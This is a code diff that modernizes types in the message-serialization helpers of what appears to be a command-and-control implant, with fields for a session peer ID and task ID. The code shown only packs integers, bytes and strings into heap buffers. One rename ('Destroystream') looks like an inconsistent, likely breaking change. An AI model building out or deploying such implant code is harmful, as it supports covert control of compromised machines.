@@ -1,7 +1,7 @@
 #include <core/include/stream.hpp>
 namespace Stream {
 
-    VOID PackInt64 (PBYTE buffer, UINT64 value) {
+    VOID PackInt64 (uint8_t *buffer, uint64_t value) {
 
         buffer[7] = value & 0xFF; value >>= 8;
         buffer[6] = value & 0xFF; value >>= 8;
@@ -13,7 +13,7 @@ namespace Stream {
         buffer[0] = value & 0xFF;
     }
 
-    VOID PackInt32 (PBYTE buffer, UINT32 value) {
+    VOID PackInt32 (uint8_t *buffer, uint32_t value) {
 
         buffer[0] = (value >> 24) & 0xFF;
         buffer[1] = (value >> 16) & 0xFF;
@@ -21,20 +21,20 @@ namespace Stream {
         buffer[3] = (value) & 0xFF;
     }
 
-    UINT32 ExtractU32 (BYTE CONST *Buffer) {
-        return Buffer[0] | (Buffer[1] << 8) | (Buffer[2] << 16) | (Buffer[3] <<24);
+    UINT32 ExtractU32 (uint8_t const *buffer) {
+        return buffer[0] | (buffer[1] << 8) | (buffer[2] << 16) | (buffer[3] <<24);
     }
 
-    PSTREAM CreateStreamWithHeaders(ULONG MsgType) {
+    PSTREAM CreateStreamWithHeaders(uint32_t msg_type) {
 
         HEXANE
-        PSTREAM Stream = CreateStream();
+        PSTREAM stream = CreateStream();
 
-        PackDword(Stream, Ctx->Session.PeerId);
-        PackDword(Stream, Ctx->Session.CurrentTaskId);
-        PackDword(Stream, MsgType);
+        PackDword(stream, Ctx->Session.PeerId);
+        PackDword(stream, Ctx->Session.CurrentTaskId);
+        PackDword(stream, msg_type);
 
-        return Stream;
+        return stream;
     }
 
     PSTREAM CreateStream () {
@@ -43,7 +43,7 @@ namespace Stream {
         PSTREAM stream = { };
         if (
             !(stream            = S_CAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, sizeof(STREAM)))) ||
-            !(stream->Buffer    = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, sizeof(BYTE)))) {
+            !(stream->Buffer    = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, sizeof(uint8_t)))) {
             return_defer(ntstatus);
         }
 
@@ -54,65 +54,65 @@ namespace Stream {
         return stream;
     }
 
-    VOID DestroyStream (PSTREAM Stream) {
+    VOID Destroystream (PSTREAM stream) {
         HEXANE
 
-        if (Stream) {
-            if (Stream->Buffer) {
+        if (stream) {
+            if (stream->Buffer) {
 
-                x_memset(Stream->Buffer, 0, Stream->Length);
-                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Stream->Buffer);
+                x_memset(stream->Buffer, 0, stream->Length);
+                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, stream->Buffer);
 
-                Stream->Buffer  = nullptr;
-                Stream->PeerId  = 0;
-                Stream->TaskId  = 0;
-                Stream->MsgType = 0;
-                Stream->Length  = 0;
+                stream->Buffer  = nullptr;
+                stream->PeerId  = 0;
+                stream->TaskId  = 0;
+                stream->MsgType = 0;
+                stream->Length  = 0;
             }
 
-            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Stream);
+            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, stream);
         }
     }
 
-    VOID PackByte (PSTREAM stream, BYTE data) {
+    VOID PackByte (PSTREAM stream, uint8_t data) {
         HEXANE
 
         if (stream) {
-            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(BYTE));
+            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(uint8_t));
 
-            x_memcpy(S_CAST(PBYTE, stream->Buffer) + stream->Length, &data, sizeof(BYTE));
-            stream->Length += sizeof(BYTE);
+            x_memcpy(B_PTR(stream->Buffer) + stream->Length, &data, sizeof(uint8_t));
+            stream->Length += sizeof(uint8_t);
         }
     }
 
-    VOID PackDword64 (PSTREAM stream, ULONG64 data) {
+    VOID PackDword64 (PSTREAM stream, uint64_t data) {
         HEXANE
 
         if (stream) {
-            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(ULONG64));
+            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(uint64_t));
 
-            PackInt64(S_CAST(PBYTE, stream->Buffer) + stream->Length, data);
-            stream->Length += sizeof(UINT64);
+            PackInt64(B_PTR(stream->Buffer) + stream->Length, data);
+            stream->Length += sizeof(uint64_t);
         }
     }
 
-    VOID PackDword (PSTREAM stream, ULONG data) {
+    VOID PackDword (PSTREAM stream, uint32_t data) {
         HEXANE
 
         if (stream) {
-            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(ULONG));
+            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(uint32_t));
 
-            PackInt32(S_CAST(PBYTE, stream->Buffer) + stream->Length, data);
-            stream->Length += sizeof(ULONG);
+            PackInt32(B_PTR(stream->Buffer) + stream->Length, data);
+            stream->Length += sizeof(uint32_t);
         }
     }
 
-    VOID PackBytes (PSTREAM stream, PBYTE data, SIZE_T size) {
+    VOID PackBytes (PSTREAM stream, uint8_t *data, size_t size) {
         HEXANE
 
         if (stream) {
             if (size) {
-                PackDword(stream, size);
+                PackDword(stream, S_CAST(uint32_t, size));
                 stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + size);
 
                 x_memcpy(S_CAST(PBYTE, stream->Buffer) + stream->Length, data, size);
@@ -121,20 +121,20 @@ namespace Stream {
         }
     }
 
-    VOID PackPointer (PSTREAM stream, PVOID pointer) {
+    VOID PackPointer (PSTREAM stream, void *pointer) {
 #ifdef _M_X64
-        PackDword64(stream, R_CAST(UINT_PTR, pointer));
+        PackDword64(stream, R_CAST(uintptr_t, pointer));
 #elif _M_IX86
-        PackDword(stream, S_CAST(UINT_PTR, pointer));
+        PackDword(stream, S_CAST(uintptr_t, pointer));
 #endif
     }
 
-    VOID PackString (PSTREAM stream, LPSTR data) {
-        PackBytes(stream, R_CAST(PBYTE, data), x_strlen(data));
+   VOID PackString (PSTREAM stream, char* data) {
+        PackBytes(stream, R_CAST(uint8_t*, data), x_strlen(data));
     }
 
-    VOID PackWString (PSTREAM stream, LPWSTR data) {
-        PackBytes(stream, R_CAST(PBYTE, data), x_wcslen(data));
+    VOID PackWString (PSTREAM stream, wchar_t* data) {
+        PackBytes(stream, R_CAST(uint8_t*, data), x_wcslen(data));
     }
 }
 
